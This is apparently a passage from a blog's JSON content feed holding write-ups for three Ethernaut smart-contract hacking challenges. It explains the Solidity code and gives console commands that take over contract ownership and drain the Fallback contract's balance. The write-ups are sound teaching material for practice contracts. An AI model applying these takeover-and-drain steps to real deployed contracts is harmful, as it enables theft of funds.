uint256; 8 9 mapping(address =\u0026gt; uint256) allocations; 10 address payable public owner; 11 12 /* constructor */ 13 function Fal1out() public payable { 14 owner = msg.sender; 15 allocations[owner] = msg.value; 16 } 17 18 modifier onlyOwner() { 19 require(msg.sender == owner, \u0026#34;caller is not the owner\u0026#34;); 20 _; 21 } 22 23 function allocate() public payable { 24 allocations[msg.sender] = allocations[msg.sender].add(msg.value); 25 } 26 27 function sendAllocation(address payable allocator) public { 28 require(allocations[allocator] \u0026gt; 0); 29 allocator.transfer(allocations[allocator]); 30 } 31 32 function collectAllocations() public onlyOwner { 33 msg.sender.transfer(address(this).balance); 34 } 35 36 function allocatorBalance(address allocator) public view returns (uint256) { 37 return allocations[allocator]; 38 } 39} If you feel like you understood the contract you can move to the exploit part. If you are a begineer please go through contract Explaination also. It will help you to understand the solidity better.\nIn this contract, they are using the SafeMath library to prevent overflow and underflow issues\nThere are two state variables in contract allocations which is mapping of address to uint, and owner ,which represents the owner of the contract.\nWe can see a comment indicating the presence of a constructor. In Solidity, if a function has the same name as the contract, it serves as the constructor. These types of constructors are called as legacy constructor. However, this behavior is only applicable in Solidity versions prior to 0.7.0.\nThen we can see a modifier named onlyOwner.\n1 modifier onlyOwner() { 2 require(msg.sender == owner, \u0026#34;caller is not the owner\u0026#34;); 3 _; 4 } Modifiers are reusable code blocks that can be run before and/or after a function call. In a modifier, everything written before the underscore and semicolon (_;) is executed before the function call, and everything after the underscore and semicolon is executed after the function call. Modifiers are used to check if certain conditions are met before or after calling the function. If the conditions in the modifier are not satisfied, the function call will revert or fail.\nThen we can see a function named allocate().\n1 function allocate() public payable { 2 allocations[msg.sender] = allocations[msg.sender].add(msg.value); 3 } The allocate() function is a public and payable function, which means it can be called from outside the contract and accepts Ether as payment. When this function is called, it increases the allocation of the caller (msg.sender) by adding the value of the sent Ether (msg.value) to their current allocation. 1 function sendAllocation(address payable allocator) public { 2 require(allocations[allocator] \u0026gt; 0); 3 allocator.transfer(allocations[allocator]); 4 } The sendAllocation() function is a public function, which means it can be called from outside the contract. This function takes an address payable parameter allocator and transfers the allocation of the specified allocator to their wallet. However, before making the transfer, it checks if the allocation of the allocator is greater than 0 using the require statement. If the allocation is not greater than 0, the function will revert. 1 function collectAllocations() public onlyOwner { 2 msg.sender.transfer(address(this).balance); 3 } The collectAllocations() function is a public function that allows the owner of the contract to collect all the Ether allocated to the contract. This function uses the onlyOwner modifier, which restricts access to only the owner of the contract. When called, it transfers the entire balance of the contract to the owner\u0026rsquo;s wallet, effectively collecting all the allocations. 1 function allocatorBalance(address allocator) public view returns (uint256) { 2 return allocations[allocator]; 3 } The allocatorBalance() function is a public view function that takes an address parameter allocator and returns the allocation balance of the specified allocator. Exploit probably you will know what is a legacy constructor if you read the contract explaination part. If you did not read go and read the constructor part.\nThe challenge is to become owner of the contract. The only place the owner is changed is at the constructor. It is supposed to be a constructor.\nIf you clearly see the function Fal1out() which is supposed to be a consturctor it\u0026rsquo;s name is different from contract name. Instead of l it is having 1. So as the name of function different from contract name it doesn\u0026rsquo;t work as a constructor.\nAs it Fal1out() is a normal function we can directly call it and become the owner of the contract.\nNow it\u0026rsquo;s time to open the console. Open Fallout challenge and enter ctrl+shift+j to open the console.\n1\u0026gt; await contract.Fal1out() Once you call Fal1out() function you can submit the challenge. ***Hope you enjoyed this write-up. Keep on hacking and learning!***\n","date":"October 23, 2024","img":"","lang":"en","langName":"","largeImg":"","permalink":"/blogs/ethernaut/fallout/","series":[{"title":"Ethernaut","url":"/series/ethernaut/"}],"smallImg":"","tags":[],"timestamp":1729625212,"title":"Fallout"},{"authors":[],"categories":[{"title":"Blockchain","url":"/categories/blockchain/"}],"content":" Writeup for Fallback Hello h4ck3r welcome to the world of smart contract hacking. Solving the challenges from Ethernaut will help you understand solidity well.For every challenge they will deploy the contract and give us the instance of that contract and we need to interact with the contract and exploit. Dont worry If you are completely new to solidity and you never deployed smart contract, you can learn deploying the a contract using remix here. Challenge In this level our task is claim ownership of this contract and make the balance of the contract to zero. Solution First i will explain every function in the contract.\nThe contract has two state variables one is mapping named contributions which stores individual person to their contributions and a owner state variable which is initialized during the deployment of contract.\nIn the constructor it is setting up the owner to msg.sender and it is setting the contributions of msg.sender to 1000 ether.\n1 constructor() { 2 owner = msg.sender; 3 contributions[msg.sender] = 1000 * (1 ether); 4 } Note: msg.sender is the address of the user or contract that is interacting with the contract. This can be thought of as the \u0026ldquo;sender\u0026rdquo; of the message or transaction. Note: msg.value is the amount of Ether that is being sent to the contract as part of a transaction. This can be thought of as the \u0026ldquo;value\u0026rdquo; being transferred to the contract. 1 modifier onlyOwner() { 2 require(msg.sender == owner, \u0026#34;caller is not the owner\u0026#34;); 3 _; 4 } Modifiers are code that can be run before and / or a function call. Everything written before underscore and semicolon is executed before the function call and everything after underscore and semicolon will be executed after the function call. Modifiers are used to check some conditions are met or not before or after calling the function. If the conditions in modifier are not satisfied then the function call fails. 1 function contribute() public payable { 2 require(msg.value \u0026lt; 0.001 ether); 3 contributions[msg.sender] += msg.value; 4 if (contributions[msg.sender] \u0026gt; contributions[owner]) { 5 owner = msg.sender; 6 } 7 } The function contribute() is a public function. Initially it checks for if msg.value is less than 0.001 ether or not. If yes it will continue executing the next statements else it will revert. Then it is updating the contributions of the msg.sender with the ether that has sent during the function call. Then it checks if the contributions of msg.sender is greater than existing owner or not. If yes then it will make the msg.sender as the new owner.\nWe can see that the existing owner was set in constructor during the deployment of contract. The owner was set to the address of one who deployed balance with balance of 1000 ether.\nIn order to claim the ownership we need to send more than 1000 ether during the function call. But, it is not possible due to initial checks.\n1 function getContribution() public view returns (uint256) { 2 return contributions[msg.sender]; 3 } This function will just return the contributions of the caller of this function. If you are interacting with this function with your wallet, it will return your contributions. Similarly, if someone else calls this function with their wallet, it will return their contributions. 1 function withdraw() public onlyOwner { 2 payable(owner).transfer(address(this).balance); 3 } The function withdraw() is a public function. It uses the modifier onlyOwner() defined above to check whether owner is calling the withdraw() or not.\nSo inorder to withdraw first we need to become owner of the contract.\n1 receive() external payable { 2 require(msg.value \u0026gt; 0 \u0026amp;\u0026amp; contributions[msg.sender] \u0026gt; 0); 3 owner = msg.sender; 4 } This is the last function in the contract. receive() is a inbuilt function in solidity. In short to explain receive will be invoked when you interact with contract with data that doesn\u0026rsquo;t match any function selector or without any data. When you send some ether to contract without calling any function then receive() will be invoked.\nWe can see receive() function is checking for msg.value is greater than zero or not and if msg.sender already has some contributions or not. If both the conditions are satisfied then it is making owner to msg.sender.\nI hope by this time you got an idea what to do. If not dont worry iam here to explain.\nIf we make a small contribution worth less than 0.001 ether to the contract by calling contribute() and then send some ETH to the contract without calling any function and without any data, we will become the owner. Once we become the owner, what else do we need to do to just drain the balance of contract?\nEthernaut is using truffle framework and truffle has a method named sendTransaction(). it is a method used to send a transaction to the Ethereum network. It\u0026rsquo;s a part of the web3.eth module, which provides an interface to interact with the Ethereum blockchain.\nNow it\u0026rsquo;s time to open the console. Open fallback challenge and enter ctrl+shift+j to open the console.\n1\u0026gt; await contract.contribute.sendTransaction({ from: player, value: 1}) This will call contribute() function with 1 wei. Since 1 wei is less than 0.001 ether (1000000000000000 wei). Wei is the smallest denomination of ether. 1 ether = 10^18 wei. 1\u0026gt; await contract.sendTransaction({ from: player, value: 1}) This will call the contract directly without specifying a function. In this case, it will send 1 wei to the contract. Since no function is specified, this call will invoke the receive() function, if it exists. If there is no receive() function in the contract we won\u0026rsquo;t be able to call contract without specifying a function.\nOnce this transaction is successful we will become the owner. Now we need to just drain the balance of contract by calling withdraw().\n1\u0026gt; await contract.withdraw() this will withdraw() Ether from the contract to your address, available only to the successful owner. Once you call withdraw() the challenge will be completed. Now you can click on submit instance to complete this challenge. Key Takeaways The receive function is a special function in Solidity that is called when a contract receives Ether (ETH) from an external source, such as a user or another contract. This function is used to handle the incoming Ether and perform any necessary actions. ***Hope you enjoyed this write-up. Keep on hacking and learning!***\n","date":"October 23, 2024","img":"","lang":"en","langName":"","largeImg":"","permalink":"/blogs/ethernaut/fallback/","series":[{"title":"Ethernaut","url":"/series/ethernaut/"}],"smallImg":"","tags":[{"title":"Fallback","url":"/tags/fallback/"}],"timestamp":1729625133,"title":"Fallback"},{"authors":[],"categories":[{"title":"Blockchain","url":"/categories/blockchain/"}],"content":" Writeup for Hello Ethernaut Hello h4ck3r welcome to the world of smart contract hacking. Solving the challenges from Ethernaut will help you understand solidity well.For every challenge they will deploy the contract and give us the instance of that contract and we need to interact with the contract and exploit. Dont worry If you are completely new to solidity and you never deployed smart contract, you can learn deploying the a contract using remix here. Challenge In this level the challenge is to call some functions from the given deployed contract. Solution In order to solve this challege you need to interact with some functions in the deployed contract. You need to open developer tools and then you can interact with the functions in the contract using console. You can enter Ctrl+Shift+J to open developer tools\nOnce you open the developer options, please go through all instructions given by challenge.\nIf we read the 9th point in instructions they asked us to call contract.info(). info() is a function in the contract deployed for this level. You can type contract.abi in the console to know all the functions in the deployed contract.\nOpen console and enter the following.\n1\u0026gt; await contract.info() The function will return \u0026lsquo;You will find what you need in info1().\u0026rsquo; So now we need to enter contract.info1() 1\u0026gt; await contract.info1() The above function will return \u0026lsquo;Try info2(), but with \u0026ldquo;hello\u0026rdquo; as a parameter.\u0026rsquo; 1\u0026gt; await contract.info2(\u0026#34;hello\u0026#34;) The above function will return \u0026lsquo;The property infoNum holds the number of the next info method to call.\u0026rsquo; Here we need to notice that the function infoNum() will return a value and the returned value can be used to call next info method. 1\u0026gt; await contract.infoNum() The above function returns a object . You can find a property named words which contains the return value at 0th index and legth of return value at 1st index. The value it returned is 42\nIf you don\u0026rsquo;t know what a object is i recommend to learn some basics of OOPS.\nHere the function just returned a value but it didn\u0026rsquo;t asked as to call any function. But if we see the return value of info2() function it says return value of infoNum() can be used to call next info methods.\nAs the return value is 42 the next method we should call is info42().\n1\u0026gt; await contract.info42() The above function will return \u0026lsquo;theMethodName is the name of the next method\u0026rsquo;. it says that we need to call a function named theMethodName(). 1\u0026gt; await contract.theMethodName() The above function will return \u0026lsquo;The method name is method7123949\u0026rsquo;. It says that we need to call a function named method7123949(). 1\u0026gt; await contract.method7123949() The above function will return \u0026lsquo;If you know the password, submit it to authenticate()\u0026rsquo;. From the return value we can conclude that if we call authenticate() with the correct password this level will be completed. But how can we know the password? Probably there will be a function named password(). We can know whether the function named password() exists or not using the contract.abi. ABI refers to Application Binary Interface. It defines the standard way to interact with the function. It contains all the function names existing in the contract with its inputs,outputs etc.. 1\u0026gt; contract.abi It will return a object containing all the functions in the contract. It is as follows. If we see the abi we can find a function named password(). Now we need to just call the function password(). 1\u0026gt; await contract.password() The above function will return \u0026lsquo;ethernaut0\u0026rsquo; Now we need to call authenticate() with input as ethernaut0 to pass this level. 1\u0026gt; await contract.authenticate(\u0026#34;ethernaut0\u0026#34;) Once you call this function the challenge will be completed. Now you can click on submit instance to complete this challenge. Key Takeaways ABI: ABI refers to Application Binary Interface. It defines how to interact with the smart contract. Understanding abi is necessary to call all the functions. To call a function on a contract, you need to provide the required input parameters, which are specified in the ABI. Understanding the input parameters and their data types is essential to successfully calling a function. ***Hope you enjoyed this write-up. Keep on hacking and learning!***\n","date":"October 23, 2024","img":"","lang":"en","langName":"","largeImg":"","permalink":"/blogs/ethernaut/hello-ethernaut/","series":[{"title":"Ethernaut","url":"/series/ethernaut/"}],"smallImg":"","tags":[],"timestamp":1729624018,"title":"Hello Ethernaut"}]
